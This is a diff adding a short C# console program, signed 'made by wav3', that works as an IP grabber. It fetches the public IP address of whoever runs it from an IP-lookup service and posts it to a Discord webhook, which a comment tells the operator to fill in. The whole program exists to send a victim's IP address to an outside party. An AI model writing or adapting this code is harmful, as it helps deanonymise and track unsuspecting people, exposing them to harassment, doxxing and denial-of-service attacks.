@@ -1,0 +1,46 @@
+using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Net;
+
+class Program
+{
+    static async Task Main()
+    {
+        try
+        {
+            string publicIp = await GetPublicIpAddressAsync();
+
+            string message = $"The public IP address of the user is: {publicIp}";
+
+            // put tha webhook here dumbass
+            string webhookUrl = "https://discordapp.com/api/webhooks/";
+            using (HttpClient client = new HttpClient())
+            {
+                var content = new StringContent($"{{\"content\": \"{message}\"}}", System.Text.Encoding.UTF8, "application/json");
+                var response = await client.PostAsync(webhookUrl, content);
+
+                if (response.IsSuccessStatusCode)
+                {
+                    Console.WriteLine("IP address sent successfully.");
+                }
+                else
+                {
+                    Console.WriteLine("Failed to send IP address. Status code: " + response.StatusCode);
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("An error occurred: " + ex.Message);
+        }
+    }
+    // made by wav3
+    static async Task<string> GetPublicIpAddressAsync()
+    {
+        using (HttpClient client = new HttpClient())
+        {
+            return await client.GetStringAsync("https://api.ipify.org");
+        }
+    }
+}
